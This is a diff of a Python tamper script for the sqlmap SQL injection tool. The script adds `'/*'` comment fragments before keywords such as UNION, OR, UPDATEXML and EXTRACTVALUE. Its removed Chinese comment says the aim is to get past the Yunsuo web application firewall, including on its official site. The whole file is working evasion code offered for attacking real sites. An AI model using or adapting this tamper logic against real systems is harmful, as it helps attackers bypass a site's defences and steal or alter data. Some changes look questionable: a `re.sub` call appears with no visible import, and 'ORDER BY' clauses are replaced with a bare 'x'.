@@ -1,5 +1,7 @@
 #!/usr/bin/env python
-#将单引号换为双引号即可绕过云锁官网
+# -*- coding: utf-8 -*-
+
+
 
 """
 Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
@@ -22,17 +24,21 @@ def dependencies():
 def tamper(payload, **kwargs):
 
         payload=payload.replace("and","'/*' and")
-        payload=payload.replace("ORDER","'/*' order")
+        payload=re.sub(r'(ORDER BY \d+)', "x", payload)
         payload=payload.replace("UNION","'/*' union")
         payload=payload.replace("WHERE (","'/*' WHERE")
         payload=payload.replace("||","||'/*'")
+        payload=payload.replace("OR ROW","'/*' OR ROW")
+        payload=payload.replace("PROCEDURE","'/*' PROCEDURE")
+        payload=payload.replace("OR 1","'/*' OR 1")
+        payload=payload.replace("OR UPDATEXML","'/*' OR UPDATEXML")
+        payload=payload.replace("OR EXTRACTVALUE","'/*' OR EXTRACTVALUE",1)
         payload=payload.replace("OR (","'/*' OR (")
         payload=payload.replace("RLIKE","'/*' RLIKE")
         payload=payload.replace("&","'/*' '&'")
         payload=payload.replace("+","'/*' +")
         payload=payload.replace("`","'/*' `")
         payload=payload.replace("AND","'/*' AND",1)
-        payload=payload.replace("(SELECT (CASE WHEN","'/*' (SELECT (CASE WHEN")
         payload=payload.replace("OPERATION","'/*' 1")
         payload=payload.replace("OR JSON","'/*' OR JSON")
         payload=payload.replace("OR EXP","'/*' OR EXP")
